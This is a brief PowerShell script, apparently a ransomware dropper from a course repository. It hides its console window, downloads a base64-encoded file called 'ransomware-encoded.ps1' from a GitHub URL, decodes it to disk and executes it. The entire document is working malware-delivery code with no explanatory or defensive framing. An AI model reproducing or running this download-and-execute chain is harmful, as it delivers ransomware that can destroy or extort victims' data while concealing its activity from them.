$url = "https://raw.githubusercontent.com/MGSE97/PVBPS/master/PowerShell/ransomware-encoded.ps1"
$output = "$PSScriptRoot\dwn.ps1"

# .Net methods for hiding/showing the console in the background
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
function Hide-Console
{
    $consolePtr = [Console.Window]::GetConsoleWindow()
    #0 hide
    [Console.Window]::ShowWindow($consolePtr, 0)
}
Hide-Console

if((Test-Path $output) -eq 0)
{
    Invoke-WebRequest -Uri $url -OutFile $output
    $content = Get-Content -Path $output -Raw
    $decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($content))
    Set-Content -Path $output -Encoding UTF8 -Value $decoded
}

& $output 